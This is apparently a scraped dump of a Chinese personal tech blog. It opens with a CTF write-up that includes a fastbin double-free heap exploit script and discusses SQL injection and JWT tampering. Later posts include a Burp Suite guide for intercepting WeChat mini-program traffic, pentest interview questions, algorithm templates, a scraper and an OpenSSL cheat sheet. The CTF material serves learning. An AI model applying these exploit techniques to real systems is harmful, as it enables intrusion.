chunk，按chunk0-&gt;chunk1-&gt;chunk0的顺序释放，第二次释放chunk0时它不在对应 fastbin 的头部，因此不会被检测到。再申请两次分别得到chunk3和chunk4，按 first-fit 原则前者即chunk0，后者即chunk1，但此时chunk0依然会留在 fastbin 中。 接下来，我们在target附近伪造 chunk。我们逆向发现lair在target上方 8B 处，因此先输入 4，设置lair=0x20以伪造chunk_size。然后输入 5 得到&amp;lair，那么&amp;lair-8处就是伪造的 chunk 的 chunk 指针。伪造好以后，我们向chunk3即chunk0的fd写入&amp;lair-8。此时，fastbin 内就变成了chunk0-&gt;fake_chunk，申请一次得到chunk0，第二次得到fake_chunk。 此时向fake_chunk写数据，等价于向(&amp;lair-8) + 0x10也就是target写数据，写入0xdeadbeef并退出程序即可。 12345678910111213141516171819202122232425262728293031323334353637def add(): sla('&gt; ','1')def delete(index): sla('&gt; ','2') sla(':\\n',str(index))def edit(index,content): sla('&gt; ','3') sla(':\\n',str(index)) sla(':\\n',content)def show(): sla('&gt; ','4') ru('0x') return int(ru('\\n'),16)def move(dest): sla('&gt; ','5') sla('?\\n', str(dest))add() # 0add() # 1add() # 2delete(0)delete(1)delete(0)add() # 3 &lt;-&gt; 0add() # 4move(0x20)fake = show()-8edit(3,fake)add() # 5add() # 6edit(6,0xdeadbeef)sla('&gt; ','6') WebUTF-8题目给了一个rfc3629的链接，也就是 UTF-8 编码的 RFC 文件。 首先访问发现是空页面，扫一下可以发现robots.txt，指向一个奇怪的文件： 1length q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log 提示说chmod +x secretscript，说明这个文件是可以运行的，因此猜想这是脚本文件，查阅资料可知这是ppencoding，放入在线 Perl 运行工具运行一下，得到： 1action=source 把这个当作 GET 参数，访问得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php$conn-&gt;query(&quot;set names utf8&quot;);$sql = &quot;create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;if ($conn-&gt;query($sql)) { $sql = &quot;insert into `user`(`username`,`passwd`,`role`) values ('admin','&quot;.md5(randStr()).&quot;','admin')&quot;; $conn-&gt;query($sql);}function filter($str) { $filter = &quot;/ |\\*|,|;|union|is|like|regexp|and|or|for|file|#|--|\\||&amp;|`|&quot;.urldecode('%a0').&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode('%0c').&quot;|&quot;.urldecode('%0d').&quot;|&quot;.urldecode('%09').&quot;/i&quot;; if(preg_match($filter,$str)) { die(&quot;?&quot;); } return $str;}function login($username,$passwd) { global $conn; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if ($username == 'admin') { die(&quot;No, I know you are not admin.&quot;); } $sql = &quot;select * from `user` where username='&quot;.$conn-&gt;escape_string($username).&quot;' and passwd='&quot;.$conn-&gt;escape_string($passwd).&quot;'&quot;; $res = $conn-&gt;query($sql); if ($res-&gt;num_rows &gt; 0) { if($res-&gt;fetch_assoc()['role'] === 'admin') { exit($flag); } } else { echo &quot;Username / Passwd Error!&quot;; }}$username = isset($_POST['username'])?filter($_POST['username']):&quot;&quot;;$passwd = isset($_POST['passwd'])?filter($_POST['passwd']):&quot;&quot;;$action = isset($_GET['action'])?filter($_GET['action']):&quot;&quot;;switch($action) { case &quot;source&quot;: source(); break; case &quot;login&quot; : login($username,$passwd);break; case &quot;show&quot; : show($username);break;}echo 'R U sure U R familiar with UTF-8?'; 过滤了很多字符，但是并不是没有报错注入的可能，利用solve.py可以注入出管理员密码。 但是直接用admin和密码登录是不行的，因为有如下判断： 123if ($username == 'admin') { die(&quot;No, I know you are not admin.&quot;);} 这里的绕过技巧来自这篇文章，细节还是比较多的，也是这题名称的由来。 jwtJSON Web Token 算法篡改攻击，看了这篇文章后改的题。最后访问admin的note的时候，会得到一个 url 路径，访问该路径即为 flag。这样做是为了支持动态 flag，因为 sqlite 对读文件的支持不是特别好。","link":"/post/MetasequoiaCTF2020/"},{"title":"Miller-Rabin 素性测试与二次探测","text":"贴定理和模板的，不是教程。 算法简介首先是一些概念： _费马小定理_：对于素数 p 和任意整数 a，有$a^p ≡ a(mod\\ p)$. 反之，对于一个数 p，如果满足$a^p ≡ a(mod\\ p)$，则 p 很可能是素数。 _伪素性测试_：瞎猜若干个 x，只要不满足上式，那么 p 就不是素数。看起来没毛病了。 _Carmichael 数_：对于合数 n，如果对所有正整数 b（b 和 n 互素）都有$b^{n-1}≡ 1 (mod\\ n)$成立，则合数 n 为 Carmichael 数。比如 561。这种数的存在使得上面的方法沦为“伪素性测试”。 _二次探测定理_：如果 p 是奇素数，x 是小于 p 的正整数，则 $x^2 ≡ 1(mod\\ p)$的解为$x = 1$或$x = p - 1(mod\\ p)$，这是由模运算的循环特性导致的。 利用二次探测定理，只需要探测 s 次就可以将错误率降到$2^{-s}$（好像是这样吧。。反正很低就对了），因此也不会多花多少时间。记得判素时的细节处理以及快速幂取模。 代码很简洁的模板了。。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;cstdio&gt;using namespace std;typedef long long ll;ll prime[5] = {2, 3, 5, 233, 331};ll pow_mod(ll a, ll n, ll mod){ ll ret = 1; while (n) { if (n &amp; 1) ret = ret * a % mod; a = a * a % mod; n &gt;&gt;= 1; } return ret;}int miller_rabin(ll n){ if (n &lt; 2 || (n != 2 &amp;&amp; !(n &amp; 1))) return 0; ll s = n - 1; while (!(s &amp; 1)) s &gt;&gt;= 1; for (int i = 0; i &lt; 5; ++i) { if (n == prime[i]) return 1; ll t = s, m = pow_mod(prime[i], s, n); while (t != n - 1 &amp;&amp; m != 1 &amp;&amp; m != n - 1) { m = m * m % n; t &lt;&lt;= 1; } if (m != n - 1 &amp;&amp; !(t &amp; 1)) return 0; } return 1;}int main(){ ll n; while (~scanf(&quot;%lld&quot;, &amp;n)) printf(&quot;%s\\n&quot;, miller_rabin(n) ? &quot;YES&quot; : &quot;NO&quot;); return 0;}","link":"/post/MillerRabin/"},{"title":"Newspaper —— 新闻统计小工具","text":"这下统计新闻要轻松多了。 背景每个月我都需要负责对部分学校二级网站进行例行检查并撰写报告，这并没有太大工作量。然而在 2020 年年初，我接到的任务是统计多个二级网站在过去一年内更新的新闻条数、点击量最高的新闻信息，并根据新闻点击量绘制散点图。一般而言，新闻条数都在 100 条以上，而许多二级网站的点击量需要点进新闻链接后才能看到，这样工作量一下子大了不少。我自然想到通过脚本来实现自动化统计。 思路使用requests库发起请求。考虑到有些网站有微弱的反爬功能，需要注意设置 UA 以及 Referer，并尽可能按照正常访问的步骤发送请求。 找到新闻列表页面后，观察网页结构并由此撰写BeautifulSoup相关代码来点击新闻链接。这里我手动获取了 2019 年最早的一条新闻所在页数作为max_page，但这些页中仍会包含 2018 与 2020 年的新闻，需要检查网页元素并通过正则筛选掉。故技重施来获取点击量数值。幸运的是，部分二级网站采用的模板相同，代码几乎不需要修改；此外，部分二级网站采用的 wordpress 模板中可以发现一个支持 POST 请求的点击量统计 url，这能为我们省去不少麻烦。 少量新闻链接会指向外部网站页面，这时去找点击量就没有一个统一的方法了，遇到这种情况可以直接跳过然后手动统计点击量，这个部分的工作量很小。 最后将数据按(点击量,日期)数值对进行存储后调用pandas库写入 Excel 即可。 依赖 bs4 requests pandas（可选） 均可以通过pip install安装。 使用根据具体的网站结构，修改： base_url news_url headers（可选） max_page SoupStrainer过滤器 各个功能函数，如page2url, get*, fillTable等 其它函数，比如在访问新闻页面前先访问网站首页等（可选） 代码给出两例代码，分别适用于社会发展学院与传播学院网站。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# Newspaper-soci.pyfrom bs4 import BeautifulSoup, SoupStrainerimport requestsimport re# constantsbase_url = 'http://www.soci.ecnu.edu.cn'news_url = base_url + '/10658/list'headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36', 'Referer': 'http://www.soci.ecnu.edu.cn/2c/24/c10658a273444/page.htm'}max_page = 11# for pandastime = []visit = []# Filter the DOM firstonly_news = SoupStrainer('div', id='wp_news_w3')def page2url(i): return news_url + str(i+1) + '.htm'def getNewsList(soup): return soup.select('div &gt; table &gt; tr')def getDate(news): return news('div')[0].stringdef getArticleURL(news): return news('a')[0]['href']def getVisitCountURL(article_url): return base_url + '/_visitcountdisplay?siteId=295&amp;type=3&amp;articleId=' + article_url[-15:-9]def fillTable(soup, date): global time, visit s = soup.find('p').string.strip() print(s) visit.append(int(s)) time.append(date[5:])def iterNews(news_list, r): date_regex = r'^2019-.*' for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith('http'): soup = BeautifulSoup(r.post(getVisitCountURL(article_url),headers=headers).text,'lxml') try: fillTable(soup, date) except: passdef export2Excel(): import pandas as pd writer = pd.ExcelWriter('output.xlsx') df = pd.DataFrame(data={'time':time, 'visit':visit}) df.to_excel(writer,'Sheet1', index=False) writer.save()def crawl(): r = requests.Session() for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, 'lxml', parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r)if __name__ == &quot;__main__&quot;: crawl() export2Excel() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Newspaper-comm.pyfrom bs4 import BeautifulSoup, SoupStrainerimport requestsimport re# constantsbase_url = 'http://www.comm.ecnu.edu.cn'news_url = base_url + '/htmlaction.do?method=toGetSubNewsList&amp;menuType=11&amp;pageNo='headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36'}max_page = 7# for pandastime = []visit = []# Filter the DOM firstonly_news = SoupStrainer(class_='news_area_text')only_detail = SoupStrainer('div',id='view_record')def page2url(i): return news_url + str(i)def getNewsList(soup): return soup('a', href=re.compile(r'.*htmlId=\\d'))def getDate(news): return news.select('.newsdate')[0].stringdef getArticleURL(news): return news['href']def getVisitCountURL(article_url): return base_url + article_urldef fillTable(soup, date): global time, visit s = soup.find('div').string[5:] print(s) visit.append(int(s)) time.append(date[10:])def iterNews(news_list, r): date_regex = r'.*2019-.*' for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith('http'): soup = BeautifulSoup(r.get(getVisitCountURL(article_url),headers=headers).text,'lxml', parse_only=only_detail) try: fillTable(soup, date) except: passdef export2Excel(): import pandas as pd writer = pd.ExcelWriter('output.xlsx') df = pd.DataFrame(data={'time':time, 'visit':visit}) df.to_excel(writer,'Sheet1', index=False) writer.save()def crawl(): r = requests.Session() r.get(base_url + '/htmlaction.do?method=toIndex') for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, 'lxml', parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r)if __name__ == &quot;__main__&quot;: crawl() export2Excel()","link":"/post/Newspaper/"},{"title":"模 p 平方根算法","text":"参考了陈恭亮《信息安全数学基础》第二版上的算法。 囊括了快速幂运算（模重复平方计算法）和求逆元（扩展欧几里得算法）两个经典的初等数论算法。模 p 平方根算法是用来求解形如$x^2 \\equiv a (mod\\ p)$的二次同余式，其中$p$为素数，且$(\\frac{a}{p}) = 1$。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556def quick_pow(a, b, p): ret = 1 a %= p while b: if b&amp;1: ret = (ret * a) % p b &gt;&gt;= 1 a = (a * a) % p return retdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('Modular inverse does not exist') else: return x % ma, p = map(int, input('Please input a, p such that x^2 = a (mod p). Input \\'-1 -1\\' to use default values: ').split())if a == -1 and p == -1: a, p = 315, 907if quick_pow(a, (p-1) // 2, p) != 1: print('No valid solution.') exit(1)s, t = p-1, 0while (s&amp;1) == 0: t += 1 s &gt;&gt;= 1print('p-1 = %d = 2^%d * %d' % (p-1, t, s))b = quick_pow(3, s, p)print('t = %d, s = %d, b = 3^s (mod p) = %d (mod p)' % (t, s, b))_a = modinv(a, p)x = quick_pow(a, (s+1) // 2, p)print('x_%d = %d (mod p), inv(a) = %d (mod p)' % (t-1, x, _a))print()for k in range(1, t): res = 1 if quick_pow(_a * x ** 2, 2 ** (t-k-1), p) == 1 else -1 print('(inv(a) * (x_%d)^2) ^ (2^%d) = %d (mod p)' % (t-k, t-k-1, res)) j = 0 if res == 1 else 1 x = (x * b**(j * 2**(k-1))) % p print('j_%d = %d, x_%d = x_%d * b ^ (j_%d * 2^(%d)) = %d (mod p)' % (k-1, j, t-k-1, t-k, k-1, k-1, x)) print()print('x_0 = %d (mod p), x_0\\' = %d (mod p)' % (x, p-x))","link":"/post/ModPSqrt/"},{"title":"抓取微信小程序数据包","text":"以 Burpsuite 为例。 背景之前针对某打卡系统写了每天自动打卡的脚本，今天一觉醒来发现后端更新导致脚本失效了，改脚本的同时把之前搜到的抓微信小程序包的方法记录下来备用。 步骤获取小程序后端域名进入小程序后点右上角 ··· -&gt; 点击小程序名 -&gt; 继续右上角 ··· -&gt; 更多资料 即可看到域名。假设为 example.com。 解析后端真实 IP直接 ping 就行，别的办法如 DNS 查询也行。假设得到 IP 为 a.b.c.d。 修改 Burpsuite 配置 Proxy -&gt; Options -&gt; Proxy Listeners 将代理服务器设置为监听所有网卡（All Interfaces），端口 443，并开启透明代理（Support invisible proxying）。 Project Options -&gt; Connections -&gt; Hostname Resolution 中手动设置域名解析，将 example.com 解析到 a.b.c.d。 修改本机 Hosts 文件编辑 C:\\Windows\\System32\\drivers\\etc\\hosts （Linux 下为 /etc/hosts），添加一行： 1127.0.0.1 example.com 最后在电脑上打开微信小程序并用 Burpsuite 抓包。 原理","link":"/post/MiniCapture/"},{"title":"MoreSec 交叉面试记录","text":"学太久二进制，去面web岗真的会雪崩。 对面试问题作了简单分类，答案基本都可以直接搜到，这里就不贴了。 信息收集 渗透测试的一般过程？ 如何查询一个域名下的所有二级域名？ 信息收集常用的渗透测试工具有哪些？ 怎么确定服务端编程语言？ SQL注入 SQL注入有哪几大类？ 布尔盲注的原理？ 布尔盲注常用到的函数？ 时间盲注常用到的函数？ benchmark函数能用于时间盲注的原理？ 如何对Oracle数据库进行时间盲注？ 怎么通过SQL注入写一句话木马？ 后端安全 如何通过redis未授权访问漏洞拿shell？ MySQL中UDF提权的过程？ 文件上传常见的绕过方式有哪些？ 前端安全 HTTP头中有哪些可以防御XSS？ js中针对XSS支持哪几种编码？ js中将十六进制转为字符串的函数是？ 什么是同源策略？ 有哪些请求方式可以跨域？ 二进制 二进制方面学习了什么？ 堆喷射的原理？ 栈溢出的原理？ 杂项 有了解过内网渗透吗？ 谈谈SRC经历。有为企业SRC挖过洞吗？ 谈谈关注的最新的CVE。 有接触过代码审计吗？有没有为开源框架找出过漏洞？ 熟悉的编程语言？ 对未来有什么职业规划？","link":"/post/MoreSec/"},{"title":"问题笔记","text":"第一篇博文。初学时一些问题的笔记。 关于类型 CodeBlocks使用MinGW编译器，long long类型输出表示为&quot;%I64d&quot;，且__int64合法； EOJ使用的似乎是g++的Linux版本编译器，long long类型输出表示为&quot;%lld&quot;,且__int64不合法。 long double类型是合法的，但是在MinGW编译器中不能格式化输入/输出。&quot;%llf&quot;,&quot;%Lf&quot;这些都不行。 关于ILEIdleness Limit Exceeded常见于交互题。在使用多个输出函数连续输出时，有可能产生输出错误，因为在上一个数据还在输出缓冲区中时，下一个printf就把另一个数据加入输出缓冲区，冲掉了原来的数据，造成输出错误。 解决方案： 在printf后加上fflush(stdout); 使用cout&lt;&lt;endl输出似乎效果等同？ 关于其它注意事项 变量/数组的初始化 scanf后回车符的吸收 gets的不安全性 getline多次使用注意添加str = &quot;\\n&quot;; getline(cin, str); EOJ编译器对getchar(); ... gets();的支持似乎不太好？ 经常把==写成=… 尽量避免使用非c标准库函数，如itoa, strlwr, strupr之类 RTE主要原因：数组越界、指针越界、除以0、栈溢出…… 逐步补充……","link":"/post/Note/"},{"title":"一些入门级函数","text":"对付 OJ 水题可有用了。 简介将以下文本粘贴在记事本中，命名为novice.h并放入编译器目录下的 include 文件夹内即可调用。欢迎补充。 索引 排序（升序） - 快速排序 - 选择排序 - 插入排序 - 冒泡排序 打印杨辉三角（需要stdio.h） 十进制转 R 进制 二分查找（找不到返回-1） 反转字符串（需要string.h） 求最大公约数 待补充 注意事项 oj 上做题时请不要直接#include这个文件，复制其中的函数即可。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#ifndef NOVICE_H_INCLUDED#define NOVICE_H_INCLUDED#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void quick_sort(int s[], int l, int r) //(s[], 0, n-1) ascending order{ int i, j, x; if (l &lt; r) { i = l; j = r; x = s[i]; while (i &lt; j) { while(i &lt; j &amp;&amp; s[j] &gt; x) j--; if(i &lt; j) s[i++] = s[j]; while(i &lt; j &amp;&amp; s[i] &lt; x) i++; if(i &lt; j) s[j--] = s[i]; } s[i] = x; quick_sort(s, l, i-1); quick_sort(s, i+1, r); }}void sel_sort(int *num, int n) //ascending order{ int i, j, min, tmp; for (i = 0;i &lt; n - 1; ++i){ min = i; for (j = i + 1; j &lt; n; ++j) if (num[min] &gt; num[j]) min = j; if (min != i){ tmp = num[min]; num[min] = num[i]; num[i] = tmp; } }}void ins_sort(int *num, int n) //ascending order{ int i, j; for (i = 1; i &lt; n; ++i){ for (j = 0; j &lt; i; ++j) if (num[j] &gt; num[i]){ int tmp = num[i], k; for (k = i; k &gt; j; --k) num[k] = num[k - 1]; num[j] = tmp; break; } }}void bubble_sort(int *num, int n) // ascending order{ int i, j; for (i = n - 1; i &gt; 0; --i){ for (j = 0; j &lt; i; ++j) if (num[j] &gt; num[j + 1]){ int tmp = num[j]; num[j] = num[j + 1]; num[j + 1] = tmp; } }}void tri(int m) //Pascal Triangle{ int i,j,a[30][30]={{0}}; for (i = 0; i &lt; m; i++) a[i][0] = 1; for (i = 1; i &lt; m; i++) for (j = 1; j &lt;= i; j++) a[i][j] = a[i-1][j-1] + a[i-1][j]; for (i = 0; i &lt; m; i++){ for (j = 0; j &lt;= i; j++){ if (j == i) printf(&quot;%d&quot;, a[i][j]); else printf(&quot;%d &quot;, a[i][j]); } printf(&quot;\\n&quot;); }}void TentoR(int a, int b) //a(base 10) to number(base b){ int cnt,number[20]; if (a == 0) return; TentoR(a / b, b); number[cnt++] = a % b;}int bin_search(int *a, int size, int p) //ascending order{ int l = 0, r = size - 1; while (l &lt;= r){ int mid = l + (r - l) / 2; if (p == a[mid]) return mid; else if (p &gt; a[mid]) l = mid + 1; else r = mid - 1; } return -1;}void rev_str(char s[]) //reverse string{ int c,i,j; for (i = 0, j = strlen(s) - 1; i &lt; j; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; }}long gcd(long a, long b) //lcm = a * b / gcd(a, b){ return b == 0 ? a : gcd(b, a % b);}#endif // NOVICE_H_INCLUDED","link":"/post/Novice/"},{"title":"数塔系列","text":"经典之所以能被称为经典，是因为其中蕴含的无限可能。 1 从顶部出发，在每一结点可以选择向左走或是向右走，一起走到底层，要求找出一条路径，使路径上的数字和最小。 说明自下向上更新每一层的最小值。 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#define min(a, b) ((a) &lt; (b) ? (a) : (b))int dp[101], a[101][101];int main(void){ int t, n, i, j; scanf(&quot;%d&quot;, &amp;t); while(t--){ scanf(&quot;%d&quot;, &amp;n); memset(dp, 0, sizeof(dp)); for (i = 0; i &lt; n; ++i) for (j = 0; j &lt;= i; ++j) scanf(&quot;%d&quot;, &amp;a[i][j]); for (i = n - 1; i &gt;= 0; --i) for (j = 0; j &lt;= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + a[i][j]; printf(&quot;%d\\n&quot;, dp[0]); } return 0;} 2 从第一行的数开始，除了某一次可以走到下一行的任意位置外，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部加起来。如何走，使得这个和尽量大？ 说明数组多建一维，值只有 0 和 1，表示是否还有传送机会剩余。对于每次更新，如果还有传送机会，考虑是否传送。用maxn记录第 n 层的最大值。这次没有额外用dp数组而是直接覆盖a数组。 1234567891011121314151617181920212223242526272829303132#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;using namespace std;int a[502][502][2], maxn[502];int main(){ int t, n, i, j; scanf(&quot;%d&quot;, &amp;t); while(t--){ scanf(&quot;%d&quot;, &amp;n); memset(maxn, 0, sizeof(maxn)); for (i = 1; i &lt;= n; ++i) for (j = 1; j &lt;= i; ++j){ scanf(&quot;%d&quot;, &amp;a[i][j][0]); a[i][j][1] = a[i][j][0]; } for (j = 1; j &lt;= n; ++j) maxn[n] = max(maxn[n], a[n][j][0]); for (i = n-1; i &gt;= 1; --i) for (j = 1; j &lt;= i; ++j){ a[i][j][0] += max(a[i+1][j][0], a[i+1][j+1][0]); maxn[i] = max(maxn[i], a[i][j][0]); a[i][j][1] += max(max(a[i+1][j][1], a[i+1][j+1][1]), maxn[i+1]); } printf(&quot;%d\\n&quot;, a[1][1][1]); } return 0;} 3 从第一行的数开始，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部加起来。如何走，使得这个和的个位数尽量大？ 说明多建一维来记录个位数，最后枚举个位数即可。 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;memory.h&gt;int dp[101][101][11], a[101][101];int main(void){ int t, n, i, j, k; scanf(&quot;%d&quot;, &amp;t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(&quot;%d&quot;, &amp;n); for (i = 0; i &lt; n; ++i) for (j = 0; j &lt;= i; ++j) scanf(&quot;%d&quot;, &amp;a[i][j]); for (i = 0; i &lt; n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i &gt;= 0; --i) for (j = 0; j &lt;= i; ++j) for (k = 0; k &lt; 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k + a[i][j]) % 10] = 1; for (i = 9; i &gt;= 0; --i) if (dp[0][0][i]){printf(&quot;%d\\n&quot;, i); break;} } return 0;} 4从第一行的数开始，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部乘起来。如何走，使得个位数的积尽量大 ? 说明和 3 同理。 1234567891011121314151617181920212223242526#include &lt;cstdio&gt;#include &lt;cstring&gt;int dp[101][101][11], a[101][101];int main(void){ int t, n, i, j, k; scanf(&quot;%d&quot;, &amp;t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(&quot;%d&quot;, &amp;n); for (i = 0; i &lt; n; ++i) for (j = 0; j &lt;= i; ++j) scanf(&quot;%d&quot;, &amp;a[i][j]); for (i = 0; i &lt; n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i &gt;= 0; --i) for (j = 0; j &lt;= i; ++j) for (k = 0; k &lt; 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k * a[i][j]) % 10] = 1; for (i = 9; i &gt;= 0; --i) if (dp[0][0][i]){printf(&quot;%d\\n&quot;, i); break;} } return 0;}","link":"/post/NumTower/"},{"title":"OpenSSL常用命令速查表","text":"仅仅记录了一些较常用的命令实例，具体命令、选项与说明推荐查阅官方文档。 注：本速查表由于篇幅限制，使用时需要读者举一反三。例如：不加-out选项会默认输出到 stdout。 base64123456789# 复制文件openssl enc -none -in file1 -out file2# base64编码openssl enc -a -in plain -out plainb64# base64解码openssl enc -a -d -in plainb64 -out plain# 从stdin读入并base64编码，无-n默认添加新行echo -n 'string' | openssl enc -a 对称密码1234567891011121314151617181920212223# 所有可用的密码算法openssl ciphers -v# 所有高强度AES加密算法openssl ciphers -v 'AES+HIGH'# 加密openssl enc -aes-256-cbc -in plain -out cipher# 加密并base64编码openssl enc -a -aes-256-cbc -in plain -out cipher# 加密，直接设置口令openssl enc -aes-256-cbc -in plain -out cipher -pass pass:123456# 加密，从文件中读取口令openssl enc -aes-256-cbc -in plain -out cipher -pass file:/home/password.txt# 加密，从环境变量中读取口令openssl enc -aes-256-cbc -in plain -out cipher -pass env:mypass# 加密，设置密钥和IVopenssl enc -aes-256-cbc -in plain -out cipher -k deadbeef -iv deadbeef# 加密，不使用盐openssl enc -aes-256-cbc -in plain -out cipher -nosalt# 加密，使用指定盐openssl enc -aes-256-cbc -in plain -out cipher -S deadbeef# 解密openssl enc -d -aes-256-cbc -in cipher -out plain 公钥密码RSA 密钥管理1234567891011121314151617181920# 生成指定长度私钥openssl genrsa -out privkey.pem 2048# 生成私钥并加密openssl genrsa -des3 -out privkey.pem# 生成私钥并加密，直接设置口令openssl genrsa -des3 -out privkey.pem -passout pass:123456# 生成私钥，用文件作为随机种子openssl genrsa -out privkey.pem -rand random.txt# 根据私钥生成公钥openssl rsa -in privkey.pem -out pubkey.pem -pubout# 移除对私钥文件的加密openssl rsa -in privkey.pem -out newkey.pem# PKCS#12私钥转PEMopenssl rsa -in privkey.p12 -inform p12 -passin pass:123456 -out newkey.pem -passout pass:654321 -aes256# 查看私钥内容openssl rsa -in privkey.pem -passin pass:123456 -text -noout# 查看公钥模数openssl rsa -in pubkey.pem -pubin -modulus -noout RSA 加解密与签名1234567891011121314151617# 公钥加密openssl rsautl -encrypt -in plain -out cipher -inkey pubkey.pem -pubin# 私钥解密openssl rsautl -decrypt -in cipher -out plain -inkey privkey.pem# 用证书中公钥加密，加密前颠倒明文openssl rsautl -encrypt -in plain -rev -out cipher -inkey cert.pem -certin# 私钥签名openssl rsautl -sign -in plain -out sig -inkey privkey.pem# 私钥签名并显示十六进制数据openssl rsautl -sign -in plain -inkey privkey.pem -hexdump# 公钥验证openssl rsautl -verify -in sig -inkey pubkey.pem -pubin# 用PKCS#12证书中私钥签名openssl rsautl -sign -in plain -out sig -inkey cert.pfx -certin -keyform pkcs12# 用PKCS#12证书中公钥验证openssl rsautl -verify -in sig -out plain -inkey cert.pfx -certin -keyform pkcs12 其它公钥密码1234567891011121314151617181920212223# 生成DH参数，5为原根openssl dhparam -outform d -out dh512.der -5 512# 生成DSA风格DH参数openssl dhparam -dsaparam -out dh512.pem 512# 生成DSA密钥参数openssl dsaparam -out dsa512.pem 512# DSA密钥参数文件转C代码openssl dsaparam -C -noout -in dsa512.pem# 查看DSA密钥参数内容openssl dsaparam -text -noout -in dsa512.pem# 生成DSA私钥并加密openssl gendsa -out dsakey.pem -aes256 -passout pass:123456 dsa512.pem# DSA私钥，PEM转DERopenssl dsa -aes-256-cbc -in dsakey.pem -passin pass:123456 -out dsakey.der -outform d -passout pass:654321# 根据DSA私钥生成公钥openssl dsa -in dsakey.pem -passin pass:123456 -out dsapubkey.pem -pubout# 所有可用的椭圆曲线openssl ecparam -list_curves# 生成EC密钥openssl ecparam -out key.pem -name prime256v1 -genkey 哈希与摘要12345678910111213141516171819# 所有可用的哈希算法openssl -list-message-digest-commands# RSA+SHA1签名openssl sha1 -sign privkey.pem -out sig plain# DSA+DSS1验证签名openssl dgst -dss1 -verify dsapubkey.pem -signature sig plain# RIPEMD-160哈希文件openssl rmd160 -out sig plain# PKCS#12格式的RSA私钥签名文件，并使用多个文件作为随机种子openssl sha1 -sign -keyform pkcs12 privkey.pfx -out sig -rand file1;file2;file3 plain# 加2字符盐哈希指定的口令openssl passwd MyPassword# 加8字符盐哈希指定的口令openssl passwd -1 MyPassword# 哈希指定的口令，使用指定的8字符盐openssl passwd -1 -salt deadbeef MyPassword 证书1234567891011121314151617181920212223# 生成自签名证书，不加密，使用新生成的RSA密钥openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout privkey.pem -out mycert.cer# 生成证书请求并加密，使用已有的RSA密钥，加密方式限定DES3-CBC，输出格式限定PEMopenssl req -new -key privkey.pem -passout pass:123456 -out req.pem# 生成自签名证书并加密，使用已有DSA密钥参数文件生成DSA密钥，限定同上openssl req -new -newkey dsa:dsa512.pem -keyout dsakey.pem -passout pass:123456 -out req.pem# 验证一个证书请求的签名openssl req -verify -in req.pem -noout -verify -key privkey.pem# 查看X.509证书的序列号，哈希值和摘要openssl x509 -in mycert.pem -noout -serial -hash -fingerprint# X.509证书，PEM转DERopenssl x509 -in mycert.pem -inform p -out mycert.der -outform d# X.509转PKCS#12，加密方式限定DES3-CBCopenssl pkcs12 -export -in mycert.pem -out cert.pfx -name &quot;My Certificate&quot;# PKCS#12转PEM，无加密openssl pkcs12 -in cert.pfx -out mycert.pem -nodes# 查看PKCS#12证书信息openssl pkcs12 -in cert.pfx -noout -info# 验证证书openssl verify mycert.pem SSL/TLS123456789101112# 连接远程SMTP服务器的25(TLS)端口openssl s_client -connect remote.host:25 -starttls smtp# 连接远程STMP服务器的465(SSL)端口，并显示其证书链openssl s_client -connect remote.host:465 -showcerts# 